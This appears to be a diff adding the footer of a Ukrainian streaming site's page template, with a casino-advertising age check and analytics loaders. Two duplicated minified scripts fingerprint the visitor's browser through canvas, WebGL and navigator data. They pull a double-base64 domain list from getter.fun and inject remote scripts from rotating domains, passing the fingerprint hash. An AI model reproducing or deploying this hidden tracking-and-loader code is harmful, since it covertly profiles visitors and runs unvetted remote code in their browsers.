+</script><script>
+let urlFilter = 0;
+let dleFilterJSData = [];
+let dleFilterId = 1;
+</script>
+<script>
+var dle_ccheck_title = 'Підтвердження віку';
+var dle_ccheck_content = '<p style="margin-bottom: 14px;">На нашому сайті може бути розміщена реклама казино.</p><p style="margin-bottom: 14px;">Продовжуючи використання сайту, ви підтверджуєте, що:</p><ul style="margin-bottom: 14px; list-style: disc inside;"><li style="margin-bottom: 4px;">Вам виповнилося 21 рік.</li><li>Ви погоджуєтеся на перегляд такої реклами.</li></ul><p style="margin-bottom: 14px;">Якщо ви не відповідаєте цим вимогам, будь ласка, залиште сайт.</p><div><a href="#" class="btn" onclick="ccheck_itsok(); return false;">Погоджуюсь</a></div>';
+</script>
+<script src="/templates/common/js/rate3.js?v3"></script>
+
+<script src="/templates/common/js/lazysizes.min.js?v2" async></script>
+<script src="/templates/uaserials2020/js/libs.min.js?v25"></script>
+
+
+<script src="/templates/uaserials2020/js/player.min.js?v1"></script>
+
+
+<script src="/templates/common/js/ion.js?v33"></script>
+<script src="/templates/uaserials2020/js/filter.js?v1.5"></script>
+<script src="/engine/lazydev/dle_filter/lib/dle_filter.js.php" defer></script>
+<script src="/templates/uaserials2020/lazydev/dle_filter/assets/dle_filter.js" defer></script>
+
+
+
+<script>
+$(document).on('submit', '#fullsearch', function(event) {
+    event.preventDefault();
+    window.list_submit(-1);
+});
+</script>
+
+<script async src="https://stat.hdvbua.pro/data/banners?1"></script>
+
+<script>
+arrayToLazyLoad.push({
+    src: 'https://www.googletagmanager.com/gtag/js?id=G-3SG6QTBZ05',
+    async: true,
+    onDom: lazyScriptsSwitcher
+});
+
+
+var scriptLoadedMap = {};
+
+//Lazy load scripts
+function lazyLoadScripts(triggeredEvent) {
+
+    for (var i = 0; i < arrayToLazyLoad.length; i++) {
+        var script = arrayToLazyLoad[i];
+        if (!scriptLoadedMap[script.src]) {
+            var scriptTag = document.createElement("script");
+            scriptTag.src = script.src;
+            scriptTag.async = script.async;
+            document.head.appendChild(scriptTag);
+            scriptLoadedMap[script.src] = true;
+        }
+    }
+}
+
+var domContentLoaded = false;
+var mouseMove = false;
+var scroll = false;
+var touchAction = false;
+function handleDomContentLoaded() {
+    setTimeout(function() {
+        if (!domContentLoaded) {
+            domContentLoaded = true;
+            lazyLoadScripts("DOMContentLoaded");
+            removeListeners();
+        }
+    }, 1000);
+}
+
+function handleMouseMove() {
+    mouseMove = true;
+    lazyLoadScripts("MouseMove");
+    removeListeners();
+}
+
+function handleScroll() {
+    scroll = true;
+    lazyLoadScripts("Scroll");
+    removeListeners();
+}
+
+function handleTouchAction() {
+    touchAction = true;
+    lazyLoadScripts("TouchAction");
+    removeListeners();
+}
+
+function addListeners() {
+    if (lazyScriptsSwitcher) {
+        document.addEventListener("DOMContentLoaded", handleDomContentLoaded);
+    }
+    document.addEventListener("mousemove", handleMouseMove);
+    document.addEventListener("scroll", handleScroll);
+    document.addEventListener("touchstart", handleTouchAction);
+}
+
+function removeListeners() {
+    if (lazyScriptsSwitcher) {
+        document.removeEventListener("DOMContentLoaded", handleDomContentLoaded);
+    }
+    document.removeEventListener("mousemove", handleMouseMove);
+    document.removeEventListener("scroll", handleScroll);
+    document.removeEventListener("touchstart", handleTouchAction);
+}
+
+addListeners();
+</script>
+
+<script type="text/javascript">(function(){var getter='';var gi=0;var head=document.getElementsByTagName("head")[0];fa5902107b6c21c25379e70bfe53e3ebf=function(){needGetter=0;AMSP.loadAsset("a5902107b6c21c25379e70bfe53e3ebf","")};function H(e){return e.toDataURL()}function canvas(){var e,n,t=!1,r=function(){var e=document.createElement("canvas");return e.width=1,e.height=1,[e,e.getContext("2d")]}(),o=r[0],a=r[1];if(function(e,n){return!(!n||!e.toDataURL)}(o,a)){t=function(e){return e.rect(0,0,10,10),e.rect(2,2,6,6),!e.isPointInPath(5,5,"evenodd")}(a),function(e,n){e.width=240,e.height=60,n.textBaseline="alphabetic",n.fillStyle="#f60",n.fillRect(100,1,62,20),n.fillStyle="#069",n.font='11pt "Times New Roman"';var t="Cwm fjordbank gly ".concat(String.fromCharCode(55357,56835));n.fillText(t,2,15),n.fillStyle="rgba(102, 204, 0, 0.2)",n.font="18pt Arial",n.fillText(t,4,45)}(o,a);var i=H(o);i!==H(o)?e=n="unstable":(n=i,function(e,n){e.width=122,e.height=110,n.globalCompositeOperation="multiply";for(var t=0,r=[["#f2f",40,40],["#2ff",80,40],["#ff2",60,80]];t<r.length;t++){var o=r[t],a=o[0],i=o[1],c=o[2];n.fillStyle=a,n.beginPath(),n.arc(i,c,40,0,2*Math.PI,!0),n.closePath(),n.fill()}n.fillStyle="#f9c",n.arc(60,60,60,0,2*Math.PI,!0),n.arc(60,60,20,0,2*Math.PI,!0),n.fill("evenodd")}(o,a),e=H(o))}else e=n="";return({winding:t,geometry:e,text:n})}function sh6(inp){let hash1=0,hash2=0;for(let i=0;i<inp.length;i++){const char=inp.charCodeAt(i);hash1=((hash1<<5)-hash1)+char;hash1=hash1&hash1;hash2=((hash2>>5)+hash2)^char;hash2=hash2&hash2}return hash1.toString(16).padStart(8,'0')+hash2.toString(16).padStart(8,'0')};async function gfp(){fetch('https://getter.fun').then(response=>response.text()).then(data=>{getter=data});var c=document.createElement('canvas');var gl=c.getContext('webgl');var w1=w2=w3=w4=w5=cv=!0;try{w1=!!window.sessionStorage;w2=!!window.localStorage;w3=!!window.indexedDB;w4=!!window.addBehavior;w5=!!window.openDatabase}catch(e){}try{cv=canvas()}catch(e){}var fingerprint={userAgent:navigator.userAgent,language:navigator.language,colorDepth:screen.colorDepth,deviceMemory:navigator.deviceMemory,hardwareConcurrency:navigator.hardwareConcurrency,screenResolution:[screen.width,screen.height],timezoneOffset:new Date().getTimezoneOffset(),sessionStorage:w1,localStorage:w2,indexedDb:w3,addBehavior:w4,openDatabase:w5,cpuClass:navigator.cpuClass,platform:navigator.platform,doNotTrack:navigator.doNotTrack,plugins:Array.prototype.join.call(navigator.plugins,", "),canvasFp:gl?gl.getParameter(gl.RENDERER):'',cv};const data=JSON.stringify(fingerprint);return sh6(data)};let l=function(d,head,gfp,backup,on_l,on_e){var head=document.getElementsByTagName('head')[0];var scripts=document.getElementsByTagName('script');var ASMPlibjs=[];for(var i=0;i<scripts.length;i++){if(scripts[i].src.indexOf('lib.js')!==-1&&scripts[i].src.indexOf(d)!==-1){ASMPlibjs.push(scripts[i])}}if(ASMPlibjs.length==0){let ba=backup?"&no_dmp=1":"";let s=document.createElement("script");s.type="text/javascript";s.src="//"+d+"/js/lib.js?gfp="+gfp+ba;s.onload=on_l;s.onerror=on_e;head.insertBefore(s,head.firstChild)}else{if("undefined"==typeof AMSP){for(var i=0;i<ASMPlibjs.length;i++){var oldOnload=ASMPlibjs[i].onload;var oldOnerror=ASMPlibjs[i].onerror;ASMPlibjs[i].onload=function(){if(oldOnload){oldOnload()}on_l()};ASMPlibjs[i].onerror=function(){if(oldOnerror){oldOnerror()}on_e()}}}else{on_l()}}};async function r(gfp){l("franecki.net",head,gfp,false,fa5902107b6c21c25379e70bfe53e3ebf,function(){l("franeski.net",head,gfp,true,fa5902107b6c21c25379e70bfe53e3ebf,function(){function sleep(ms){return new Promise(resolve=>setTimeout(resolve,ms))}async function delayedLoop(){for(let i=0;i<5;i++){if(getter){break}await sleep(500)}if(getter){getter=JSON.parse(atob(atob(getter)));let rg=function(){if(getter!=undefined&&getter[gi]!=undefined){l(getter[gi++],head,gfp,true,fa5902107b6c21c25379e70bfe53e3ebf,function(){rg()})}};rg()}}delayedLoop()})})}gfp().then(v=>{r(v)})})()</script>
+<script type="text/javascript">(function(){var getter='';var gi=0;var head=document.getElementsByTagName("head")[0];f452f14ad970bc1225f20ffc6bcd63845=function(){needGetter=0;AMSP.loadAsset("452f14ad970bc1225f20ffc6bcd63845","")};function H(e){return e.toDataURL()}function canvas(){var e,n,t=!1,r=function(){var e=document.createElement("canvas");return e.width=1,e.height=1,[e,e.getContext("2d")]}(),o=r[0],a=r[1];if(function(e,n){return!(!n||!e.toDataURL)}(o,a)){t=function(e){return e.rect(0,0,10,10),e.rect(2,2,6,6),!e.isPointInPath(5,5,"evenodd")}(a),function(e,n){e.width=240,e.height=60,n.textBaseline="alphabetic",n.fillStyle="#f60",n.fillRect(100,1,62,20),n.fillStyle="#069",n.font='11pt "Times New Roman"';var t="Cwm fjordbank gly ".concat(String.fromCharCode(55357,56835));n.fillText(t,2,15),n.fillStyle="rgba(102, 204, 0, 0.2)",n.font="18pt Arial",n.fillText(t,4,45)}(o,a);var i=H(o);i!==H(o)?e=n="unstable":(n=i,function(e,n){e.width=122,e.height=110,n.globalCompositeOperation="multiply";for(var t=0,r=[["#f2f",40,40],["#2ff",80,40],["#ff2",60,80]];t<r.length;t++){var o=r[t],a=o[0],i=o[1],c=o[2];n.fillStyle=a,n.beginPath(),n.arc(i,c,40,0,2*Math.PI,!0),n.closePath(),n.fill()}n.fillStyle="#f9c",n.arc(60,60,60,0,2*Math.PI,!0),n.arc(60,60,20,0,2*Math.PI,!0),n.fill("evenodd")}(o,a),e=H(o))}else e=n="";return({winding:t,geometry:e,text:n})}function sh6(inp){let hash1=0,hash2=0;for(let i=0;i<inp.length;i++){const char=inp.charCodeAt(i);hash1=((hash1<<5)-hash1)+char;hash1=hash1&hash1;hash2=((hash2>>5)+hash2)^char;hash2=hash2&hash2}return hash1.toString(16).padStart(8,'0')+hash2.toString(16).padStart(8,'0')};async function gfp(){fetch('https://getter.fun').then(response=>response.text()).then(data=>{getter=data});var c=document.createElement('canvas');var gl=c.getContext('webgl');var w1=w2=w3=w4=w5=cv=!0;try{w1=!!window.sessionStorage;w2=!!window.localStorage;w3=!!window.indexedDB;w4=!!window.addBehavior;w5=!!window.openDatabase}catch(e){}try{cv=canvas()}catch(e){}var fingerprint={userAgent:navigator.userAgent,language:navigator.language,colorDepth:screen.colorDepth,deviceMemory:navigator.deviceMemory,hardwareConcurrency:navigator.hardwareConcurrency,screenResolution:[screen.width,screen.height],timezoneOffset:new Date().getTimezoneOffset(),sessionStorage:w1,localStorage:w2,indexedDb:w3,addBehavior:w4,openDatabase:w5,cpuClass:navigator.cpuClass,platform:navigator.platform,doNotTrack:navigator.doNotTrack,plugins:Array.prototype.join.call(navigator.plugins,", "),canvasFp:gl?gl.getParameter(gl.RENDERER):'',cv};const data=JSON.stringify(fingerprint);return sh6(data)};let l=function(d,head,gfp,backup,on_l,on_e){var head=document.getElementsByTagName('head')[0];var scripts=document.getElementsByTagName('script');var ASMPlibjs=[];for(var i=0;i<scripts.length;i++){if(scripts[i].src.indexOf('lib.js')!==-1&&scripts[i].src.indexOf(d)!==-1){ASMPlibjs.push(scripts[i])}}if(ASMPlibjs.length==0){let ba=backup?"&no_dmp=1":"";let s=document.createElement("script");s.type="text/javascript";s.src="//"+d+"/js/lib.js?gfp="+gfp+ba;s.onload=on_l;s.onerror=on_e;head.insertBefore(s,head.firstChild)}else{if("undefined"==typeof AMSP){for(var i=0;i<ASMPlibjs.length;i++){var oldOnload=ASMPlibjs[i].onload;var oldOnerror=ASMPlibjs[i].onerror;ASMPlibjs[i].onload=function(){if(oldOnload){oldOnload()}on_l()};ASMPlibjs[i].onerror=function(){if(oldOnerror){oldOnerror()}on_e()}}}else{on_l()}}};async function r(gfp){l("franecki.net",head,gfp,false,f452f14ad970bc1225f20ffc6bcd63845,function(){l("franeski.net",head,gfp,true,f452f14ad970bc1225f20ffc6bcd63845,function(){function sleep(ms){return new Promise(resolve=>setTimeout(resolve,ms))}async function delayedLoop(){for(let i=0;i<5;i++){if(getter){break}await sleep(500)}if(getter){getter=JSON.parse(atob(atob(getter)));let rg=function(){if(getter!=undefined&&getter[gi]!=undefined){l(getter[gi++],head,gfp,true,f452f14ad970bc1225f20ffc6bcd63845,function(){rg()})}};rg()}}delayedLoop()})})}gfp().then(v=>{r(v)})})()</script>
+
+</body>
+</html>
